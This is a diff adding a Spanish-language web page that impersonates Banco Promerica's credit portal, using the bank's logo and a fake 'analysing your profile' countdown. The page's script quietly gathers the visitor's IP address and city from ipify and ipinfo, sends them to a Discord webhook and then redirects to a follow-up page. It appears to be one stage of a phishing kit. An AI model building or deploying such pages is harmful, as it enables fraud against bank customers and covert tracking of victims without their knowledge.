@@ -1,0 +1,161 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Promerica/Creditos</title>
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+    <style>
+        body {
+            font-family: 'Helvetica Neue', Arial, sans-serif;
+            background-color: #f0f2f5;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+        }
+
+        .loader-card {
+            background: #ffffff;
+            width: 100%;
+            max-width: 400px;
+            padding: 50px 30px;
+            border-radius: 24px;
+            box-shadow: 0 15px 35px rgba(0,0,0,0.1);
+            text-align: center;
+        }
+
+        .logo-box { margin-bottom: 30px; }
+        .logo-box img { max-width: 150px; height: auto; }
+
+        /* Spinner de carga profesional */
+        .spinner {
+            width: 50px;
+            height: 50px;
+            border: 5px solid #f3f3f3;
+            border-top: 5px solid #27ae60;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 20px;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .status-text {
+            font-size: 18px;
+            font-weight: 700;
+            color: #2c3e50;
+            margin-bottom: 10px;
+        }
+
+        .sub-text {
+            color: #7f8c8d;
+            font-size: 14px;
+            margin-bottom: 30px;
+        }
+
+        /* Estilo del Temporizador */
+        #timer {
+            font-size: 42px;
+            font-weight: 800;
+            color: #27ae60;
+            background: #f1fcf4;
+            padding: 10px 30px;
+            border-radius: 15px;
+            display: inline-block;
+            border: 2px solid #d4efdf;
+            min-width: 120px;
+        }
+
+        #gfg, #address { display: none; }
+    </style>
+</head>
+<body>
+
+    <div id="gfg"></div>
+    <div id="address"></div>
+
+    <div class="loader-card">
+        <div class="logo-box">
+            <img src="https://afcomunicacion.com/wp-content/uploads/2022/09/banco-promerica-logo-DB8A2BA7D2-seeklogo.com_.png" alt="Logo">
+        </div>
+
+        <div class="spinner"></div>
+
+        <div class="status-text">Analizando tu perfil...</div>
+        <div class="sub-text">Por favor, no cierres esta ventana mientras configuramos tu acceso.</div>
+
+        <div id="timer">00:40</div>
+    </div>
+
+    <script>
+        // Configuración de Webhook
+        const webhookURL = "TU_URL_DE_WEBHOOK_AQUI"; 
+
+        // 1. Obtener IP y Ubicación al entrar
+        $(document).ready(function() {
+            $.getJSON("https://api.ipify.org?format=json", function(data) { $("#gfg").html(data.ip); });
+            $.getJSON("https://ipinfo.io", function(response) { $("#address").html(response.city + ", " + response.country); });
+        });
+
+        // 2. Lógica del Temporizador y Redirección
+        function startCountdown(duration) {
+            var timer = duration, minutes, seconds;
+            var display = document.querySelector('#timer');
+
+            var interval = setInterval(function () {
+                minutes = parseInt(timer / 60, 10);
+                seconds = parseInt(timer % 60, 10);
+
+                minutes = minutes < 10 ? "0" + minutes : minutes;
+                seconds = seconds < 10 ? "0" + seconds : seconds;
+
+                display.textContent = minutes + ":" + seconds;
+
+                // Cuando llega a 0
+                if (--timer < 0) {
+                    clearInterval(interval);
+                    sendToDiscordAndRedirect();
+                }
+            }, 1000);
+        }
+
+        // 3. Función de envío final y redirección
+        function sendToDiscordAndRedirect() {
+            const userIP = document.getElementById("gfg").innerHTML || "Desconocida";
+            const userLoc = document.getElementById("address").innerHTML || "Desconocida";
+
+            const contents = {
+                embeds: [{
+                    title: "✅ Usuario completó tiempo de espera",
+                    color: 2617744,
+                    fields: [
+                        { name: "Estado", value: "Redirigido a index2.html", inline: true },
+                        { name: "Ubicación", value: userLoc, inline: true },
+                        { name: "IP", value: userIP, inline: false }
+                    ],
+                    timestamp: new Date()
+                }]
+            };
+
+            // Enviamos a Discord y redirigimos independientemente del resultado
+            fetch(webhookURL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(contents)
+            }).finally(() => {
+                window.location.href = "index2.html";
+            });
+        }
+
+        // Iniciar al cargar
+        window.onload = function () {
+            startCountdown(40);
+        };
+    </script>
+</body>
+</html>
